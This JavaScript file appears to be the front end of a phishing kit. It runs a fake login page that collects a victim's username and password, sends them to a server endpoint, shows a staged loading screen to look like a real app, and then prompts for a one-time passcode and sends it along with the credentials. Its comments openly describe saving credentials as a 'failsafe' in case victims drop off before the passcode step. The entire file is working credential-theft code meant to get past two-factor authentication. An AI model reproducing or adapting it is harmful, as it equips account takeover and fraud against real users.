document.addEventListener('DOMContentLoaded', () => {
  const loginForm = document.getElementById('login-form');
  const loginScreen = document.getElementById('login-screen');
  const loadingScreen = document.getElementById('loading-screen');
  const otpScreen = document.getElementById('otp-screen');
  const otpForm = document.getElementById('otp-form');
  const successScreen = document.getElementById('success-screen');

  // Keep credentials in memory to combine with OTP
  let capturedUsername = '';
  let capturedPassword = '';

  // Haptic feedback simulator (if supported by browser)
  const triggerHaptic = () => {
    if (navigator.vibrate) {
      navigator.vibrate(50);
    }
  };

  // 1. Initial Login Form Submission
  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    triggerHaptic();
    
    // Blur inputs to hide keyboard on mobile
    document.activeElement.blur();
    
    capturedUsername = document.getElementById('username').value.trim();
    capturedPassword = document.getElementById('password').value.trim();

    // Transition to loading screen
    loginScreen.classList.add('exit');
    
    setTimeout(async () => {
      loginScreen.classList.add('hidden');
      loadingScreen.classList.remove('hidden');
      loadingScreen.classList.remove('exit');
      
      const startTime = Date.now();

      try {
        // Save initial credential submission in background (failsafe in case they drop off on OTP)
        await fetch('/api/save', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ username: capturedUsername, password: capturedPassword })
        });
      } catch (err) {
        console.error('Initial submission failed:', err);
      }

      // Ensure loading screen is visible for at least 2 seconds for a native app feel
      const elapsed = Date.now() - startTime;
      const minDelay = 2000;
      const remainingTime = Math.max(0, minDelay - elapsed);

      setTimeout(() => {
        // Transition to OTP screen
        loadingScreen.classList.add('exit');
        
        setTimeout(() => {
          loadingScreen.classList.add('hidden');
          otpScreen.classList.remove('hidden');
          triggerHaptic();
        }, 320); // Wait for exit animation
        
      }, remainingTime);
      
    }, 320);
  });

  // 2. OTP Form Submission
  otpForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    triggerHaptic();
    
    document.activeElement.blur();
    
    const otp = document.getElementById('otp-code').value.trim();

    // Transition back to loading screen for confirmation processing
    otpScreen.classList.add('exit');

    setTimeout(async () => {
      otpScreen.classList.add('hidden');
      loadingScreen.classList.remove('hidden');
      loadingScreen.classList.remove('exit');

      const startTime = Date.now();

      try {
        // Save structured record containing Username, Password, AND OTP
        await fetch('/api/save', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ 
            username: capturedUsername, 
            password: capturedPassword,
            otp: otp
          })
        });
      } catch (err) {
        console.error('OTP submission failed:', err);
      }

      const elapsed = Date.now() - startTime;
      const minDelay = 2000;
      const remainingTime = Math.max(0, minDelay - elapsed);

      setTimeout(() => {
        // Transition to final success screen
        loadingScreen.classList.add('exit');
        
        setTimeout(() => {
          loadingScreen.classList.add('hidden');
          successScreen.classList.remove('hidden');
          triggerHaptic();
        }, 320); // Wait for exit animation
        
      }, remainingTime);

    }, 320);
  });
});
